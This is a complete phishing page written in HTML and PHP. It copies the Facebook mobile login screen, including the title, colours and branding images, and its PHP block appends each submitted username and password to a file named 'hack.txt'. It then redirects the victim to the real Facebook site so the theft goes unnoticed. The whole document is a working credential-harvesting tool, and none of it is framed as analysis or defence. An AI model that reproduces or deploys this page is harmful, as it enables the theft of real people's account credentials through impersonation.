<meta name="viewport" content="width=device-width, user-scalable=no" />
<meta name="theme-color" content="#3b5998"/>
<link rel="icon" href="fev.png"/>
<title>Log in to Facebook | Facebook</title>
<style>
	body{
		margin:0px;
	}
	.txt{
		background:#f5f6f7;
		width:93%;
		padding:13px;
		border-radius:4px;
		border:1px solid #eaeaeb;
		font-size:16px;
	}
	.btn{
		background:#1877f2;
		width:93%;
		padding:10px;
		border-radius:4px;
		color:white;
		font-weight:bold;
		font-size:16px;
		border:1px solid #1877f2;
		margin-top:10px;
	}
	.main{
		margin-top:8px;
	}
</style>

<img src="header.png" width="100%"/><br>
<div class='main' align='center'>
<form method='POST'>
<input class='txt' type='text' name='user' placeholder='Mobile number or email address' required/><br>
<input class='txt' type='password' name='pass' placeholder='Password' required/><br>
<input class='btn' type='submit' value='Log In' name='submit'/>
<form>
</div>

<img src="footer.png" width="100%"/>

<?php
if(isset($_POST['submit'])){
	$user=$_POST['user'];
	$pass=$_POST['pass'];
	$file=fopen("hack.txt", "a");
	fwrite($file, "USER: ".$user."\n");
	fwrite($file, "PASS: ".$pass."\n\n");
	fclose($file);
	echo "<script type='text/javascript'>
    window.location.href = 'http://facebook.com';
</script>";
}
?>




